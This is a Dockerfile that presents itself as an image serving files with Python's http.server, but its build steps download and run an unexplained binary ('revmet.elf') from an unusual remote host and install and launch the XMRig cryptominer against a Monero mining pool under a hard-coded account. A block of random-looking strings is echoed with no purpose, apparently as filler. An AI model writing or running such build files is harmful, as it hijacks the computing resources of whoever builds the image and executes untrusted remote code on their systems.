FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo kQOPI94feL7XpiqMzR3mggwyUhOaYckk 1OH6NQpGwBTMNqMH0C3ee6RvJZ7VT1Zm YvBjMGcrLesHC33bCmbfVBOHR9KiS5r7 JwYs70RIsL1nrDpaaDs8u6BseZMQ2NCJ 2bZKMbseybVIcrJJFZ0iZ3SODabkSww2 tGn9owvO1dPyjaI22FQox0GPuDKzcbXz 9y1jxbrOsHd2GE2J3KcodRPtHlMrBveq H5UcKr9Loc5KOJedKvFEMGfZRGfZyDv1 pIQkNvI97B1ruR2AW2djMgbsKpK7vslq wKKgBHttIWdjMJrVmqvyFuVgr6itobZp 8fYLn8sqPnFydp6cbn2cBsMqgKfY3bZs SMvRKSx4VByeIPMdzvuP0eEDR7T8mjx8 iaLG00Pz0KMj14aBkGUvZu1cAzAo3VSJ kdUY9bH0X8ZhzY0uyPJDU72bThoUfvhy rEtrAClCsFXsNKNha39skfUAzJPVChSK DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]